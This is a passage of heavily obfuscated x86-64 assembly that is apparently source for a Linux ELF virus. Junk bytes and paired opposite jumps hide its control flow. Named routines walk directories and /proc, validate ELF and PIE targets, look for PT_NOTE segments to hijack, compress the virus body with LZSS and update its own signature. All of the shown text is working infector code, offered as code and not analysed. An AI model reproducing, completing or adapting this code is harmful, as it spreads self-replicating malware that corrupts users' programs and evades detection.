    jge         ..@B6iOLoxgCiSm
..@i5I1SLnji789:
    syscall
    jmp         $+5
db 0x87, 0x60, 0xd0
    js          ..@YDtdfe1Sq8CO
    jns         ..@YDtdfe1Sq8CO
..@FJbzAIJlRe5q:
    mov         WORD [rsp+_LZSSE_OFF.match_pos], bx
    jb          ..@fuN7j2mTKt4h
    jae         ..@fuN7j2mTKt4h
..@SMckVljYm5Au:
    sub         rcx, m6
    mov         eax, 0x00
    rep         stosb
    jl          ..@8GmdO8WyLAZV
    jge         ..@8GmdO8WyLAZV
..@xzzSlNn6IaZj:
    add         r4, 1
    jmp         $+5
db 0x65, 0x75, 0xf7
    jb          ..@UY6ONonz96eO
    jae         ..@UY6ONonz96eO
..@dHBJw1fYedmk:
    add         rbx, 1
    mov         rsi, QWORD [rsp+_DYNPIE_OFF.ptr]
    jmp         $+3
db 0xa1
    jb          ..@xryDQ1y2I9LD
    jae         ..@xryDQ1y2I9LD
..@FvpNHFZl78ra:
    mov         r1, r5
    cmp         BYTE [r1], 0x00
    js          ..@5vI6f72u2sFK
    jns         ..@5vI6f72u2sFK
..@mkescq5Qdjvs:
    push        r1
    jmp         $+3
db 0x2a
    jmp         $+5
db 0xb4, 0x9a, 0x8d
    jmp         ..@q11p1b4bNtPS
..@RzdPHosprkxK:
    ret
    jmp         InfectDirectory
..@FTJjUvbnymZA:
    je          ..@Rd58TJuBDh03
    xor         r3, r3
    jmp         $+3
db 0x6f
    js          ..@uIQSLyUme2Zn
    jns         ..@uIQSLyUme2Zn
..@B6iOLoxgCiSm:
    mov         r1, [rsp+_NBF_OFF.file]
    jmp         $+5
db 0x42, 0x91, 0x3e
    jmp         ..@Ny0Pgk64lueE
..@ri6MwqARLp4A:
    mov         dx, WORD [rsp+_LZSSE_OFF.la_index]
    jmp         $+5
db 0xe6, 0x95, 0xfd
    jl          ..@T2pgqwjQxm1Z
    jge         ..@T2pgqwjQxm1Z
FileValidation:
    jmp         ..@15ZyIFNswynd
..@rN09HOLWLKkx:
    mov         QWORD [rsp+_VADDR_OFF.tmp_vaddr], 0
    mov         QWORD [rsp+_VADDR_OFF._vaddr], 0
    jmp         ..@pmkghotGYKwD
..@ceESOjpVmhyB:
    mov         r2w, WORD [rsp+_NBF_OFF.index]
    call        UpdateSignature
    mov         r1, QWORD [r5+file.fileptr]
    jmp         $+3
db 0x78
    js          ..@smKLMgXPkga9
    jns         ..@smKLMgXPkga9
..@nl4gVcKkxDzt:
    lea         r2, [rsp+_PROC_OFF.buffer+0x6]
    js          ..@vq7wrNrSDKxp
    jns         ..@vq7wrNrSDKxp
..@E12MtQHXIwJa:
    mov         rax, 1
    jmp         $+5
db 0xe2, 0x3a, 0x4e
    jmp         $+5
db 0xfb, 0xcb, 0x8d
    jmp         ..@RSUiE4NS5Pmy
..@xebuhO6qp8CY:
    jge         ..@dHBJw1fYedmk
    cmp         QWORD [rsi+rcx], DT_FLAGS_1
    jmp         $+5
db 0xd0, 0x2b, 0x83
    jmp         ..@HfdYQqV1YVi6
..@7BbPjQEwPe47:
    jne         ..@cS6c66HTlUaz
    jmp         $+4
db 0x02, 0xf3
    jmp         ..@M2BZ7QA3lU5h
..@96H6TQfqgoQW:
    mov         r2w, WORD [rsp+_PAYLOAD_OFF.index]
    mov         r3d, DWORD [rsp+_PAYLOAD_OFF.key]
    mov         r4, 0
    je          ..@saqN5JMUfBgR
    jne         ..@saqN5JMUfBgR
..@aFecCX8SInui:
    mov         rcx, m7
    jb          ..@SMckVljYm5Au
    jae         ..@SMckVljYm5Au
IsNum:
    jmp         ..@wGno3Lq37lNv
..@dPD0BooPh80v:
    xor         rax, rax
    lea         r1, [rsp+_PROC_OFF.dirbuf+r4]
    mov         ax, WORD [r1+linux_dirent.d_reclen]
    js          ..@qah3BI5phGpq
    jns         ..@qah3BI5phGpq
..@TG2SY1lJr2M4:
    sub         QWORD [rsp+_LZSSE_OFF.length], rcx
    jmp         ..@5T6asNugz2P0
..@pbjYpIfgL2ih:
    test        eax, eax
    jmp         $+3
db 0xd7
    je          ..@FDTmGGmiDg17
    jne         ..@FDTmGGmiDg17
..@rcCjuVt271rR:
    add         rdi, _signature.index-_signature.start
    mov         DWORD [rdi], eax
    jmp         ..@oRDoP9DAaATR
..@TxnqhqKazGEX:
    mov         WORD [rsp+_UPDATASIG_OFF.index], r2w
    GGLOBAL     _signature.start
    jmp         $+3
db 0x15
    jmp         $+4
db 0xc2, 0x38
    jmp         $+3
db 0x9c
    jmp         ..@WQihQLcGfcf2
..@eEJkBNoajoIV:
    cmp         al, 0xa
    jmp         $+5
db 0xd9, 0xfc, 0x6a
    jmp         ..@4snTVLGmzYkL
..@4snTVLGmzYkL:
    jl          ..@sv2ZjJ5lBsEf
    jb          ..@ds0Qm8DOLW7U
    jae         ..@ds0Qm8DOLW7U
..@EtJdDshjWXXW:
    cmp         rax, 0x00
    jle         ..@tWtXJ5a7f5r8
    mov         QWORD [rsp+_PROC_OFF.dirnread], rax
    jmp         $+5
db 0x9c, 0xad, 0x6d
    jmp         $+3
db 0xc7
    jmp         ..@PoqDx0pqFdd3
..@cPJMfmdalc2W:
    call        DestroyPayload
    jmp         ..@oz0w6dKg0d2f
..@FH0BkZoIzYyv:
    mov         QWORD [r5+file.filesize], r3
    jmp         $+3
db 0x4b
    je          ..@be6BcuOpQGuC
    jne         ..@be6BcuOpQGuC
..@cVnpZp6h4CT9:
    sub         rsp, _DYNPIE_OFF_size
    xor         rax, rax
    jb          ..@Y7NtDm9eoh4u
    jae         ..@Y7NtDm9eoh4u
..@M5X3BnBt52ar:
    OFILE       [r1], 0x10000
    cmp         eax, 0x03
    je          ..@Ktrqqo6CscD3
    jne         ..@Ktrqqo6CscD3
..@xAqfyvYECtTD:
    mov         r2, QWORD [rsp+_INFDIR_OFF.dirname]
    call        Strcpy
    mov         BYTE [r1], '/'
    jl          ..@JuywueUZvW7l
    jge         ..@JuywueUZvW7l
..@fkZj1tYVPfrB:
    or          bx, dx
    jmp         ..@zhU3qJ93gPC1
..@zAiDqZUNyCK2:
    xor         rbx, rbx
    xor         rdx, rdx
    mov         al, BYTE [rsp+_LZSSE_OFF.match_len]
    je          ..@mS30275tJASv
    jne         ..@mS30275tJASv
UnmapFile:
    jmp         ..@zTfBb3vsAlu4
..@YtcnbgTDtOVG:
    shr         BYTE [rsp+_LZSSE_OFF.mask], 1
    jmp         ..@43y2LsKZfc2a
..@ViiT1xQWe48y:
    xor         rax, rax
    jmp         $+3
db 0x58
    jmp         ..@NRGNa6W3oCUn
..@5T6asNugz2P0:
    lea         rdi, [rsp+_LZSSE_OFF.buffer]
    xor         rax, rax
    je          ..@zlP8TzrwGrMm
    jne         ..@zlP8TzrwGrMm
..@aGQgpSjJ10zS:
    mov         r2b, BYTE [rsp+_INFDIR_OFF.depth]
    add         r2, 1
    call        InfectDirectory
    jmp         $+5
db 0x46, 0xcf, 0x99
    jl          ..@ipFKcvr45wQl
    jge         ..@ipFKcvr45wQl
..@oyoqPVLAw2uN:
    mov         QWORD [rsp+_LZSSE_OFF.inputaddr], rsi
    je          ..@ZBAxqXiSk8Vs
    jne         ..@ZBAxqXiSk8Vs
..@e051e89yAKXG:
    je          ..@FaUNt1bceu6m
    cmp         rax, 0x01
    js          ..@jfJUAMCAZAwp
    jns         ..@jfJUAMCAZAwp
..@TP3zax1Pdf2L:
    xor         rax, rax
    jmp         $+5
db 0xc6, 0xd0, 0x9d
    jl          ..@7AzfoYaFybFW
    jge         ..@7AzfoYaFybFW
..@15ZyIFNswynd:
    mov         r5, r1
    jl          ..@h8utXn83wrLY
    jge         ..@h8utXn83wrLY
..@GrTpQe5FK9bE:
    add         ecx, 1
    jb          ..@xlfIajT2jGiZ
    jae         ..@xlfIajT2jGiZ
..@tnlQWRI74ZDU:
    call        GetNewProgramVaddr
    jmp         $+3
db 0x10
    js          ..@KJvTHENEDQxJ
    jns         ..@KJvTHENEDQxJ
..@ScIVejNrJtUP:
    jnz         ..@R4FxM6IERCtl
    jmp         $+4
db 0x11, 0x28
    je          ..@AulT9fKsgL1j
    jne         ..@AulT9fKsgL1j
..@VVBHaBlNihaD:
    jmp         ..@02DoeAJ124yA
    jb          ..@GmHTSRd027zE
    jae         ..@GmHTSRd027zE
..@LXCReLo1Ftbm:
    test        rax, rax
    jmp         $+4
db 0x9b, 0xb4
    jmp         $+3
db 0x49
    jmp         $+4
db 0x3c, 0x50
    jmp         $+4
db 0xcf, 0xee
    jb          ..@zHf20fCsNJWV
    jae         ..@zHf20fCsNJWV
..@7zkJ94yCxPBb:
    mov         r1, m6
    add         r1, non_packed_len+PADDING
    mov         r2, m8
    jmp         $+3
db 0x2e
    jmp         $+5
db 0x72, 0xfe, 0x61
    jmp         $+5
db 0x06, 0xfe, 0x0d
    jl          ..@MI8cq6CMWXUz
    jge         ..@MI8cq6CMWXUz
..@w8VR0C2bgnQF:
    add         r1, e_h.e_shentsize
    mov         ax, WORD [r1]
    mov         WORD [rsp+_DYNPIE_OFF.shentsize], ax
    jmp         $+5
db 0x28, 0xa4, 0x8e
    jmp         $+4
db 0x94, 0x5f
    jl          ..@dWvfhMmFT98e
    jge         ..@dWvfhMmFT98e
..@nKIu22vEbPLt:
    add         r5, rax
    add         r5, 1
    jmp         ..@FvpNHFZl78ra
    jmp         $+3
db 0x54
    js          ..@0TFSreZN7avO
    jns         ..@0TFSreZN7avO
..@611tBUgINy3K:
    pop         r1
    jmp         ..@2rWPr1Nv0NoB
..@gGUmXOYXPMIK:
    mov         rdi, QWORD [r5+file.fileptr]
    jmp         ..@mHmEoXiu7NjD
..@0TFSreZN7avO:
    pop         r1
    cmp         r1, 0x00
    je          ..@RzdPHosprkxK
    jmp         $+3
db 0x1d
    jl          ..@3FtceDVcgj4W
    jge         ..@3FtceDVcgj4W
..@naVkSRdjTKKL:
    cmp         r4, QWORD [rsp+_PROC_OFF.dirnread]
    jmp         $+5
db 0x33, 0x16, 0xb1
    jmp         $+5
db 0xfa, 0xd0, 0xa3
    js          ..@ouZrOPgHJLzy
    jns         ..@ouZrOPgHJLzy
..@DPG9LbfuQgei:
    mov         edx, 100000000b
    jmp         $+4
db 0x71, 0xf2
    jmp         $+3
db 0x9d
    js          ..@fkZj1tYVPfrB
    jns         ..@fkZj1tYVPfrB
..@3hS0pnVkBRJH:
    add         rax, r1
    jb          ..@IlE8CzxGpNgV
    jae         ..@IlE8CzxGpNgV
..@53Mc727uXALt:
    xor         rax, rax
    xor         rcx, rcx
    mov         rdi, m6
    jmp         ..@aFecCX8SInui
..@Pu5aY6fv4l0C:
    mov         r1, r5
    jmp         ..@ti9e8aBphQqq
..@WSK8StwspNBB:
    mov         r3, non_packed_len
    call        MemMove
    jl          ..@7zkJ94yCxPBb
    jge         ..@7zkJ94yCxPBb
..@RbCupw3Su7TY:
    jmp         ..@oz0w6dKg0d2f
    jmp         $+3
db 0xc2
    jmp         $+5
db 0x2a, 0x7a, 0xfb
    jmp         ..@FaUNt1bceu6m
..@qt1I7nDQRdCR:
    mov         r1d, eax
    mov         r3d, 0x02
    mov         eax, SYS_LSEEK
    jl          ..@xUDVpy35guCE
    jge         ..@xUDVpy35guCE
..@gb8GclFahczY:
    add         r4, rax
    cmp         r4, QWORD [rsp+_INFDIR_OFF.dirnread]
    jl          ..@Ka5eOpjPkbWG
    jmp         $+5
db 0xea, 0xf2, 0x31
    jmp         $+5
db 0x24, 0x36, 0xe3
    js          ..@VFeM7Uac7lDe
    jns         ..@VFeM7Uac7lDe
..@LYYdE28N9k6i:
    je          ..@cGP4eVS9c0f1
    jmp         ..@ZI0VvMoussGt
..@HfdYQqV1YVi6:
    jne         ..@b0M8V4CQhfqO
    jmp         ..@xfTPgyrccQWI
..@gdm0H23kuy9C:
    rep         movsb
    jmp         ..@Qvl4OciLIY97
..@wWabWtHX888k:
    je          ..@K20YvJKbMacp
    jmp         ..@JdKyMMUhxL96
..@7qvQzIaGimHh:
    mov         r2, m5
    jl          ..@MtBwkrQvV0d1
    jge         ..@MtBwkrQvV0d1
..@BWESNSRQAtOx:
    jne         ..@E12MtQHXIwJa
    jmp         $+4
db 0x74, 0x56
    jb          ..@etfoIz5aiHgu
    jae         ..@etfoIz5aiHgu
..@EfPDgmEdYbl1:
    xor         rax, rax
    mov         rsi, [rsp+_LZSSE_OFF.inputaddr]
    jmp         $+4
db 0xa8, 0x55
    jb          ..@ZaxpSJZJOf1W
    jae         ..@ZaxpSJZJOf1W
..@DMv8HagVn3cq:
    mov         BYTE [rsp+_LZSSE_OFF.character], al
    mov         bx, WORD [rsp+_LZSSE_OFF.la_index]
    jmp         ..@Grjy3p8I7hHH
    jb          ..@YlYAIacUZF2V
    jae         ..@YlYAIacUZF2V
..@VFeM7Uac7lDe:
    jmp         ..@5SlIFDCBMoj5
    jmp         $+5
db 0x56, 0x72, 0x01
    jmp         $+5
db 0x1a, 0x27, 0x50
    jmp         ..@r0jEBtDpSJ32
..@xlfIajT2jGiZ:
    rep         cmpsb
    jne         ..@ARx5EzeSo5IE
    jl          ..@ARx5EzeSo5IE
    jge         ..@ARx5EzeSo5IE
..@WQihQLcGfcf2:
    mov         rsi, r5
    jmp         $+3
db 0xfa
    jb          ..@bnQl9mVciHRN
    jae         ..@bnQl9mVciHRN
..@Wesp2uJKn8Ae:
    ODIR        [rsp+_PROC_OFF.dirfd], [rsp+_PROC_OFF.dirbuf], DIRENT_BUFSIZE
    jb          ..@EtJdDshjWXXW
    jae         ..@EtJdDshjWXXW
..@vlw8G6ck9nSA:
    add         ecx, 1
    jmp         ..@c5UJBFEtM3SR
..@UW9MoKrI49p8:
    xor         rdx, rdx
    mov         bl, BYTE [rsp+_LZSSE_OFF.character]
    jl          ..@DPG9LbfuQgei
    jge         ..@DPG9LbfuQgei
..@AWGNoDAzuc2m:
    test        ax, ax
    jz          ..@JrQf5sqP4je4
    jb          ..@mLQhfk7cMGUC
    jae         ..@mLQhfk7cMGUC
..@dWvfhMmFT98e:
    add         r1, 2
    jmp         $+5
db 0xe3, 0x3d, 0xce
    jmp         ..@tHIgyKasS4JR
AddSizeMappedFile:
    jmp         ..@s2oS4vp4kJUZ
..@1qvRUY99GgtH:
    xor         rax, rax
    jmp         $+4
db 0x19, 0x1e
    jl          ..@tE5ZdIYc6T3a
    jge         ..@tE5ZdIYc6T3a
..@xryDQ1y2I9LD:
    cmp         bx, WORD [rsi+e_h.e_shnum]
    jl          ..@IeWHdtvy0mkF
    mov         rax, 1
    jmp         $+3
db 0xb6
    jmp         $+4
db 0x18, 0x0b
    jb          ..@90lndXXin7rh
    jae         ..@90lndXXin7rh
..@z3e56uweUBMK:
    mov         QWORD [rsp+_LZSSE_OFF.inputaddr], r1
    jmp         $+3
db 0x39
    jmp         $+4
db 0xee, 0xfc
    jmp         ..@lhd4BZJ8awDg
..@nnfXH979z2cH:
    push        r5
    jmp         $+5
db 0x05, 0x10, 0x47
    jb          ..@aoon4D8YUFEz
    jae         ..@aoon4D8YUFEz
..@bMw3eRIC6lrR:
    cmp         BYTE [r1+16], ET_DYN
    jmp         $+5
db 0xd6, 0xdf, 0x0b
    jl          ..@vLMeYDjrNmE5
    jge         ..@vLMeYDjrNmE5
..@ipFKcvr45wQl:
    jmp         ..@cGP4eVS9c0f1
    jmp         ..@5Xxh6Tlgi9LX
..@AZNY8vcQkTVa:
    pop         r5
    jmp         $+3
db 0x10
    jmp         $+5
db 0xf4, 0x49, 0x41
    js          ..@uswTHaCXDIQL
    jns         ..@uswTHaCXDIQL
..@nJOLs7KRiFEA:
    mov         ax, WORD [rsp+_LZSSE_OFF.buffersize]
    cmp         WORD [rsp+_LZSSE_OFF.la_index], ax
    js          ..@WwnbxsLj9j2z
    jns         ..@WwnbxsLj9j2z
..@WJ81698VnNJX:
    add         rsp, _LZSSE_OFF_size
    jmp         $+3
db 0x11
    jmp         ..@hvoRkrj9Z3zl
..@BjS5sCIfxMKQ:
    mov         r3, rax
    jmp         $+3
db 0x35
    jmp         $+5
db 0x4c, 0x9b, 0x82
    jl          ..@wc8sq7jlwphn
    jge         ..@wc8sq7jlwphn
..@ti9e8aBphQqq:
    call_vsp    GetEnv
    jmp         $+3
db 0x41
    jb          ..@LXCReLo1Ftbm
    jae         ..@LXCReLo1Ftbm
..@88KHKzk7iMJP:
    cmp         BYTE [r1], 0x0
    jmp         $+3
db 0x7d
    jmp         $+3
db 0x4a
    jmp         ..@kmMqVhldp3u8
..@OLLN75csFyr5:
    mov         rsi, QWORD [rsp+_DYNPIE_OFF.ptr]
    je          ..@92tgH7fsDH79
    jne         ..@92tgH7fsDH79
..@rZ7qNVQsHsgv:
    mov         r1, QWORD [r5+file.filename]
    cmp         BYTE [r1], '/'
    jne         ..@R4FxM6IERCtl
    jmp         ..@Fgiw9j80GDpd
..@2FeOVF5N35MH:
%ifdef X86_32
    mov         edi, DWORD [edi+file.filefd]
    push        ebp
    xor         ebp, ebp
%endif
    jmp         $+3
db 0xd1
    jmp         $+3
db 0xb3
    jl          ..@tFrW7VuAK6e3
    jge         ..@tFrW7VuAK6e3
..@WwnbxsLj9j2z:
    jl          ..@558pDbgxYslW
    jmp         $+4
db 0x4d, 0xde
    js          ..@pNPXcdf9P64o
    jns         ..@pNPXcdf9P64o
..@3tNBhpLHsnY3:
    mov         rax, rdi
    js          ..@2mxMqNlQBChT
    jns         ..@2mxMqNlQBChT
..@aqQJId3DOxJd:
    pop         rax
    js          ..@3tNBhpLHsnY3
    jns         ..@3tNBhpLHsnY3
..@FwrEdYABRkw3:
    jnz         ..@deLH2ZVwwuI3
    jmp         $+4
db 0xce, 0x85
    js          ..@QPGIokYsnVu8
    jns         ..@QPGIokYsnVu8
..@FVbnrmrs1RgV:
    sub         QWORD [rsp+_LZSSE_OFF.length], rcx
    jl          ..@mRjmRZHpQhPm
    jge         ..@mRjmRZHpQhPm
..@JuywueUZvW7l:
    add         r1, 1
    jmp         ..@XRUKR0kN8b25
..@cBMxW4sJqczX:
    xor         r2, r2
    jmp         ..@OslxAhAtn3Bf
..@C1eZv0BFC7yJ:
    xor         rax, rax
    xor         rbx, rbx
    mov         al, BYTE [rdi]
    jmp         $+5
db 0xe2, 0xe0, 0x7c
    jmp         ..@DMv8HagVn3cq
..@IriRmcrWM58o:
    mov         QWORD [rsp+_INFDIR_OFF.dirname], r1
    jmp         $+4
db 0xe5, 0x01
    jmp         $+3
db 0xd1
    js          ..@H2uflChhbadf
    jns         ..@H2uflChhbadf
..@RNBEKprEyYtf:
    jz          ..@gcIgl41igXcn
    jmp         ..@S3Tu4SPEY4if
..@FZFrNryPZlU0:
    cmp         DWORD [r2+rax], PT_NOTE
    jne         ..@fEZYZfYiXlPL
    add         r2, rax
    js          ..@3Osun3h9m88i
    jns         ..@3Osun3h9m88i
..@wORN9LOXlfnZ:
    mov         BYTE [rdi], al
    jmp         $+3
db 0xa8
    jb          ..@NMPApKGAWw8J
    jae         ..@NMPApKGAWw8J
..@UaHgTkrnephY:
    mov         BYTE [r1], 0x00
    jmp         ..@SC5NgB7EcbW3
..@fd0fMSuLNTzK:
    mov         r3, r4
    mov         r2, m6
    jmp         $+4
db 0x69, 0xba
    jmp         $+4
db 0x63, 0xf3
    jl          ..@TFIJ1m0WvM70
    jge         ..@TFIJ1m0WvM70
..@z03l69SjKtJw:
    push        r3
    jmp         $+5
db 0x6e, 0x17, 0xab
    jmp         ..@tnlQWRI74ZDU
..@tfJb39ROecoI:
    push        rax
    js          ..@xcJAVtwS8bU8
    jns         ..@xcJAVtwS8bU8
..@s2oS4vp4kJUZ:
    push        r4
    push        r5
    xor         r4, r4
    jmp         $+3
db 0x90
    jmp         $+3
db 0x0d
    jmp         $+5
db 0xfb, 0xa0, 0xd7
    jl          ..@JpUHAHTziuB7
    jge         ..@JpUHAHTziuB7
..@YbHiqcIxYmDk:
    sub         rsp, _LZSSE_OFF_size
    jmp         $+4
db 0x78, 0x55
    jmp         ..@z3e56uweUBMK
..@asYunRcCUT72:
    mov         rsi, rdi
    jmp         $+3
db 0xc2
    jmp         $+4
db 0xc8, 0x7e
    jmp         $+3
db 0x75
    jb          ..@xY73kzQhpMQT
    jae         ..@xY73kzQhpMQT
..@QgGokKcGlq3I:
    mov         rax, QWORD [rsp+_LZSSE_OFF.outputaddr]
    sub         rax, QWORD [rsp+_LZSSE_OFF.saveoutptr]
    jmp         $+3
db 0x62
    jl          ..@WJ81698VnNJX
    jge         ..@WJ81698VnNJX
..@deLH2ZVwwuI3:
    shr         edx, 1
    test        edx, edx
    jnz         ..@qjamrc8Zkrya
    jmp         $+3
db 0x20
    jl          ..@F5fl1l2ePLuS
    jge         ..@F5fl1l2ePLuS
..@HHMH1QTmd0ga:
    lea         r1, [rsp+_INFDIR_OFF.buffer]
    js          ..@xAqfyvYECtTD
    jns         ..@xAqfyvYECtTD
..@VokoT8rXSPuX:
    OFILE       QWORD [r2], r4
    jb          ..@kF610wwLqtH1
    jae         ..@kF610wwLqtH1
..@kDdjOSsxIOp6:
    sub         WORD [rsp+_LZSSE_OFF.la_index], WINDOW_LENGTH
    sub         WORD [rsp+_LZSSE_OFF.w_index], WINDOW_LENGTH
    jmp         $+5
db 0xd4, 0x20, 0x3c
    je          ..@oRIIsOKnwQqg
    jne         ..@oRIIsOKnwQqg
..@WhpQIqB4Bbmo:
    jmp         ..@33Q4If3rtkYg
    jb          ..@JrQf5sqP4je4
    jae         ..@JrQf5sqP4je4
..@ds0Qm8DOLW7U:
    jmp         ..@fDgo3tTEMuNL
    jmp         $+3
db 0xcb
    jl          ..@sv2ZjJ5lBsEf
    jge         ..@sv2ZjJ5lBsEf
..@f8MMphwCNwOe:
    mov         BYTE [rsp+_LZSSE_OFF.cmp_len], dl
    mov         BYTE [rsp+_LZSSE_OFF.match_len], 0x0
    mov         BYTE [rsp+_LZSSE_OFF.match_pos], 0x1
    jmp         $+3
db 0x27
    jmp         ..@KDyl77Nevxfa
..@wc8sq7jlwphn:
    call_vsp    Strncmp
    jmp         $+4
db 0xe3, 0x51
    jmp         $+4
db 0xc8, 0xf5
    jl          ..@AWGNoDAzuc2m
    jge         ..@AWGNoDAzuc2m
..@X2XK3cqDiXZ3:
    mov         r5, [rsp+_NBF_OFF.file]
    mov         r1, QWORD [r5+file.fileptr]
    jmp         $+3
db 0x9b
    jb          ..@LWhXC9HX8Hwm
    jae         ..@LWhXC9HX8Hwm
..@wUVMi5w87VJ2:
    mov         r3, r2
    jmp         ..@EYKfcEkgsGn4
..@W8aWR0JOSzYq:
    lea         r1, [rsp+_INFDIR_OFF.buffer]
    jmp         $+5
db 0x80, 0x33, 0x49
    jl          ..@DzflMao0AsxA
    jge         ..@DzflMao0AsxA
..@P9eJzPAnxrp9:
    lea         r1, [rsp+_PROC_OFF.dirbuf+linux_dirent.d_name+r4]
    call        IsNum
    test        eax, eax
    jmp         $+5
db 0x0d, 0xb8, 0xc0
    jmp         ..@7syp8lfBLtw1
..@az5roZGdhsEm:
    xor         rcx, rcx
    mov         rdi, m7
    jmp         ..@htprqlefq5Hb
..@eZgpzd7Y37PK:
    mov         r3, rax
    and         r5, (PAGE_SIZE-1)
    jmp         ..@PEUVk47jwmlL
..@QO2ioFcHPdap:
    mov         ax, dx
    jmp         $+3
db 0x02
    jmp         $+4
db 0x9d, 0x75
    je          ..@IdIyO6AfnuAn
    jne         ..@IdIyO6AfnuAn
..@ikgPTaTG2OSC:
    mov         r2, QWORD [r1+e_h.e_phoff]
    jmp         ..@UqoHUG7h3iVp
..@ea6y2kJGRO6Q:
    lea         r2, [rsp+_INFDIR_OFF.dirbuf+linux_dirent.d_name+r4]
    call        Strcpy
    mov         BYTE [r1], 0x00
    jmp         $+5
db 0x3d, 0xd9, 0x8b
    js          ..@W8aWR0JOSzYq
    jns         ..@W8aWR0JOSzYq
..@t72eQN8DIfP3:
    push        r1
    jb          ..@6MaP5NLZJnsu
    jae         ..@6MaP5NLZJnsu
..@y1qLUpfx4vE3:
    jmp         ..@cPJMfmdalc2W
    jmp         ..@fEZYZfYiXlPL
..@VBOd5pmHZyKq:
    cmp         rax, (-1)
    je          ..@cPJMfmdalc2W
    jb          ..@fd0fMSuLNTzK
    jae         ..@fd0fMSuLNTzK
..@BeckXTiHvYQ6:
    jne         ..@cS6c66HTlUaz
    jmp         $+4
db 0x1c, 0x2f
    js          ..@7qvQzIaGimHh
    jns         ..@7qvQzIaGimHh
..@IlE8CzxGpNgV:
    pop         r1
    mov         r2, QWORD [r1+file.filesize]
    cmp         rax, r2
    jmp         $+4
db 0xbd, 0x06
    jmp         ..@BWESNSRQAtOx
..@NRGNa6W3oCUn:
    CFILE       DWORD [r5+file.filefd]
    jmp         $+5
db 0x07, 0x36, 0x10
    jmp         ..@9vHlxQj499aM
..@rzmYlC2dkt0q:
    mov         r2, original_virus_len-non_packed_len
    call        LzssEncoder
    jmp         $+5
db 0xdd, 0xed, 0x59
    jmp         $+4
db 0xbe, 0xdb
    js          ..@AKKpTyEdzWi5
    jns         ..@AKKpTyEdzWi5
..@tHIgyKasS4JR:
    mov         ax, WORD [r1]
    jmp         $+3
db 0xda
    jmp         $+4
db 0x55, 0x7f
    js          ..@EL2u7S8kz1Ne
    jns         ..@EL2u7S8kz1Ne
..@P9K9gnW58pSG:
    jne         ..@dHBJw1fYedmk
    xor         rcx, rcx
    jmp         $+5
db 0x13, 0xf5, 0xdb
    jmp         ..@u2671wA8w3oE
..@4gjhzjLOmt6y:
    or          bx, ax
    jmp         $+4
db 0xe9, 0x7f
    jmp         $+3
db 0xba
    js          ..@qjamrc8Zkrya
    jns         ..@qjamrc8Zkrya
..@mU56aDurDmUw:
    cmp         eax, 0x03
    jb          ..@yBbajFDp4b40
    jae         ..@yBbajFDp4b40
..@KJvTHENEDQxJ:
    pop         r3
    pop         r2
    jmp         $+3
db 0x19
    jmp         ..@ZP0tJIpC5Yac
..@AAeU2EO7h7Nu:
    jle         ..@r0jEBtDpSJ32
    mov         QWORD [rsp+_INFDIR_OFF.dirnread], rax
    mov         QWORD [rsp+_INFDIR_OFF.dirindex], 0x00
    jmp         $+4
db 0x87, 0x9f
    jmp         ..@Ka5eOpjPkbWG
..@EQOmeEaGQwBu:
    sub         r2, 1
    jmp         $+4
db 0x1c, 0x40
    jb          ..@02DoeAJ124yA
    jae         ..@02DoeAJ124yA
..@KF0eJeiscMqz:
%ifdef X86_64
    mov         edx, r10d
    mov         r10d, 0x01
    mov         r8d, DWORD [r8+file.filefd]
%endif
    jmp         $+4
db 0x73, 0xad
    jmp         ..@PcRi3GUg7dO2
..@wclrNHCxHZ5n:
    jmp         ..@AT4Mi9T5InEx
    jmp         ..@dHBJw1fYedmk
..@43y2LsKZfc2a:
    mov         al, BYTE [rsp+_LZSSE_OFF.mask]
    test        al, al
    jl          ..@FwrEdYABRkw3
    jge         ..@FwrEdYABRkw3
..@sLwgKSYSsHZn:
    je          ..@R4FxM6IERCtl
    mov         rax, 2
    jmp         $+3
db 0x30
    jmp         $+5
db 0x3e, 0xec, 0x1c
    jb          ..@UTAheQLoudYG
    jae         ..@UTAheQLoudYG
..@gI4riGJKnxAm:
    sub         r4, QWORD [r1+e_h.e_entry]
    jb          ..@aHIbMhtktNDd
    jae         ..@aHIbMhtktNDd
..@lDPCQjI2IXkd:
    test        rax, rax
    jb          ..@css0Mku3Lg6e
    jae         ..@css0Mku3Lg6e
..@EwwXMTBBWSfX:
    add         WORD [rsp+_LZSSE_OFF.la_index], ax
    add         WORD [rsp+_LZSSE_OFF.w_index], ax
    jmp         ..@admmFm0dmqQ6
..@GmHTSRd027zE:
    mov         rax, QWORD [rsp+_VADDR_OFF.tmp_vaddr]
    add         rax, QWORD [rsp+_VADDR_OFF.tmp_offset]
    jmp         $+3
db 0x88
    js          ..@mZiVHHiV3xzU
    jns         ..@mZiVHHiV3xzU
..@qah3BI5phGpq:
    add         r1, rax
    jmp         $+3
db 0xaa
    jmp         $+4
db 0x78, 0x63
    jmp         ..@5cGkiEfguI94
..@jK29AMnrSIXE:
    jne         ..@rZ7qNVQsHsgv
    jb          ..@XfVfNAWujDt4
    jae         ..@XfVfNAWujDt4
..@xQvb7rRxqTnr:
    xor         rax, rax
    mov         ax, WORD [r5+e_h.e_shentsize]
    jb          ..@4rSSipskJqEz
    jae         ..@4rSSipskJqEz
..@FaUNt1bceu6m:
    xor         r2, r2
    jl          ..@emjYrA44lYPe
    jge         ..@emjYrA44lYPe
..@4V0WiCVSx7LX:
    mov         r1, QWORD [r5+e_h.e_shoff]
    xor         r2, r2
    mov         r2w, WORD [r5+e_h.e_shnum]
    jmp         $+3
db 0x14
    jmp         $+3
db 0xa4
    jmp         ..@xQvb7rRxqTnr
..@YSmfw3iAb0qD:
    syscall
    cmp         rax, 0xffffffffffffffff
    je          ..@u3eSpwI3CJEw
    jl          ..@EYt5me9UaoIq
    jge         ..@EYt5me9UaoIq
..@T2pgqwjQxm1Z:
    add         rsi, rdx
    mov         cl, BYTE [rsp+_LZSSE_OFF.cmp_len]
    jmp         $+4
db 0x6a, 0x9f
    jmp         ..@GrTpQe5FK9bE
..@RgYpBPPfuPHY:
    cmp         rax, (-1)
    je          ..@FTJjUvbnymZA
    jne         ..@FTJjUvbnymZA
..@6SFt36CqftJu:
    add         rsp, _VADDR_OFF_size
    pop         r1
    ret
    jmp         $+3
db 0x6e
    jmp         $+4
db 0x4d, 0xfb
    jmp         DYNPIEValidation
..@AT4Mi9T5InEx:
    cmp         rcx, QWORD [rdi+s_h.sh_size]
    jmp         ..@xebuhO6qp8CY
..@ziSSMFPK2cam:
    push        r1
    xor         rdi, rdi
    xor         rcx, rcx
    jmp         ..@xq8Kb3w9pHem
..@HysXOoq8YAw3:
    jg          ..@TP3zax1Pdf2L
    jmp         $+3
db 0x84
